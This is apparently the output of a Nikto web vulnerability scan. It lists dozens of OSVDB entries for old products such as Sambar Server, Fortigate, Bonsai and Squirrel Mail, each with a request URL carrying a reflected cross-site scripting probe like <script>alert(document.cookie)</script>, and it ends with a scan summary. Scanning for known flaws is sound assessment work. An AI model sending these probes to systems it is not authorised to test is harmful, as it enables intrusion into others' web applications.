++ OSVDB-2562: /SPHERA/login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2790: /index.php?vo=\"><script>alert(document.cookie);</script>: Ralusp Sympoll 1.5 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2921: /shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script>: VP-ASP prior to 4.50 are vulnerable to XSS attacks
++ OSVDB-2921: /shopdisplayproducts.asp?id=1&cat=<script>alert(document.cookie)</script>: VP-ASP Shopping Cart 4.x shopdisplayproducts.asp XSS.
++ OSVDB-2950: /showmail.pl?Folder=<script>alert(document.cookie)</script>: @Mail WebMail 3.52 contains an XSS in the showmail.pl file.
++ OSVDB-3280: /forum/memberlist.php?s=23c37cf1af5d2ad05f49361b0407ad9e&what=\">\"<script>javascript:alert(document.cookie)</script>: Vbulletin 2.2.9 and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3289: /firewall/policy/dlg?q=-1&fzone=t<script>alert('Vulnerable')</script>>&tzone=dmz: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages.
++ OSVDB-3294: /firewall/policy/policy?fzone=internal&tzone=dmz1<script>alert('Vulnerable')</script>: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages.
++ OSVDB-3295: /antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages.
++ OSVDB-3295: /antispam/listdel?file=whitelist&name=a<script>alert('Vulnerable')</script>&startline=0(naturally): Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages.
++ OSVDB-3296: /theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\"><script>alert('Vulnerable')</script>,/system/status/session: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages.
++ OSVDB-3296: /theme1/selector?button=status,monitor,session&button_url=/system/status/status\"><script>alert('Vulnerable')</script>,/system/status/moniter,/system/status/session: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages.
++ OSVDB-3296: /theme1/selector?button=status,monitor,session\"><script>alert('Vulnerable')</script>&button_url=/system/status/status,/system/status/moniter,/system/status/session: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages.
++ OSVDB-3417: /examplesWebApp/InteractiveQuery.jsp?person=<script>alert('Vulnerable')</script>: BEA WebLogic 8.1 and below are vulnerable to Cross Site Scripting (XSS) in example code. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0624. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3458: /sgdynamo.exe?HTNAME=<script>alert('Vulnerable')</script>: Ecometry's SGDynamo is vulnerable to Cross Site Scripting (XSS). http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0375. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3483: /docs/<script>alert('Vulnerable');</script>: Nokia Electronic Documentation is vulnerable to Cross Site Scripting (XSS). http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0801.
++ OSVDB-3486: /aktivate/cgi-bin/catgy.cgi?key=0&cartname=axa200135022551089&desc=<script>alert('Vulnerable')</script>: Aktivate Shopping Cart 1.03 and lower are vulnerable to Cross Site Scripting (XSS). http://www.allen0keul.com/aktivate/ http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1212, http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3632: /webcalendar/colors.php?color=</script><script>alert(document.cookie)</script>: Webcalendar 0.9.42 and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3633: /webcalendar/week.php?user=\"><script>alert(document.cookie)</script>: Webcalendar 0.9.42 and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3762: /debug/dbg?host==<script>alert('Vulnerable');</script>: The TCLHttpd 3.4.2 server is vulnerable to Cross Site Scripting (XSS) in debug scripts. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3762: /debug/echo?name=<script>alert('Vulnerable');</script>: The TCLHttpd 3.4.2 server is vulnerable to Cross Site Scripting (XSS) in debug scripts. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3762: /debug/errorInfo?title===<script>alert('Vulnerable');</script>: The TCLHttpd 3.4.2 server is vulnerable to Cross Site Scripting (XSS) in debug scripts. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3762: /debug/showproc?proc===<script>alert('Vulnerable');</script>: The TCLHttpd 3.4.2 server is vulnerable to Cross Site Scripting (XSS) in debug scripts.
++ OSVDB-4262: /addressbook.php?\"><script>alert(Vulnerable)</script><!--: Squirrel Mail 1.2.7 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-4265: /help.php?chapter=<script>alert('Vulnerable')</script>: Squirrel Mail 1.2.7 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5097: /wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/create.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/edit.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/ftp.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/htaccess.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/iecreate.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/ieedit.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/info.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/rename.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/search.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/sendmail.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/template.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/update.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/vccheckin.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/vccreate.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5098: /sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5099: /sysuser/docmgr/edit.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5099: /sysuser/docmgr/ieedit.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5099: /sysuser/docmgr/info.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5099: /sysuser/docmgr/rename.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5099: /sysuser/docmgr/sendmail.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5099: /sysuser/docmgr/update.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5099: /sysuser/docmgr/vccheckin.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5099: /sysuser/docmgr/vccreate.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5099: /sysuser/docmgr/vchist.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5102: /syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5102: /syshelp/stmex.stm?foo=<script>alert(document.cookie)</script>&bar=456: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5103: /syshelp/cscript/showfunc.stm?func=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5104: /syshelp/cscript/showfncs.stm?pkg=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5105: /syshelp/cscript/showfnc.stm?pkg=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5106: /netutils/ipdata.stm?ipaddr=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5107: /netutils/findata.stm?host=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5107: /netutils/findata.stm?user=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5108: /sysuser/docmgr/search.stm?query=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5457: /webtools/bonsai/cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('Vulnerable')</script>&branch=HEAD: Bonsai is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5458: /webtools/bonsai/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script>: Bonsai is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5458: /webtools/bonsai/cvsquery.cgi?module=<script>alert('Vulnerable')</script>&branch=&dir=&file=&who=<script>alert(document.domain)</script>&sortby=Date&hours=2&date=week: Bonsai is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5459: /webtools/bonsai/cvslog.cgi?file=*&rev=&root=<script>alert('Vulnerable')</script>: Bonsai is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5459: /webtools/bonsai/cvslog.cgi?file=<script>alert('Vulnerable')</script>: Bonsai is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5460: /webtools/bonsai/cvsblame.cgi?file=<script>alert('Vulnerable')</script>: Bonsai is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5461: /webtools/bonsai/showcheckins.cgi?person=<script>alert('Vulnerable')</script>: Bonsai is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-6659: /Xrd2xgBYD2qbDxrlbLPblYzTe3LBmInF4KGKS9c2z3fput2Q2ojRp6StIX9CyJlpt35LQMqUBpemDrjgPjcWNHVSWtMxpRqER6xcjNgrQuFAIgIOKFYhyyhKKwhxsWJOTTT2Cwcrg9h7Wo0oOM8ZLdQBGImi30OSjfOgs6AE23tFUX3CTD9J73cvwtrGS1Uh9yU4qp0K9iun58tglPEiAC1OdxxiJuj<font%20size=50><script>alert(11)</script><!--//--: MyWebServer 1.0.2 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-701: /pls/dadname/htp.print?cbuf=<script>alert('Vulnerable')</script>: Oracle 9iAS is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-701: /pls/help/<script>alert('Vulnerable')</script>: Oracle 9iAS is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-20954: /shopadmin.asp?Password=abc&UserName=\"><script>alert(foo)</script>: VP-ASP Shopping Cart 5.50 shopadmin.asp UserName Variable XSS.
++ OSVDB-20406: /phpinfo.php?GLOBALS[test]=<script>alert(document.cookie);</script>: PHP contains a flaw that allows a remote cross site scripting attack.
++ OSVDB-35935: /rpc.php?q=\"><script>alert(document.cookie)</script>: Unobtrusive Ajax Star Rating Bar is vulnerable to XSS in the q variable.
++ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
++ Scan terminated:  19 error(s) and 220 item(s) reported on remote host
++ End Time:           2020-04-06 20:33:11 (GMT2) (205 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
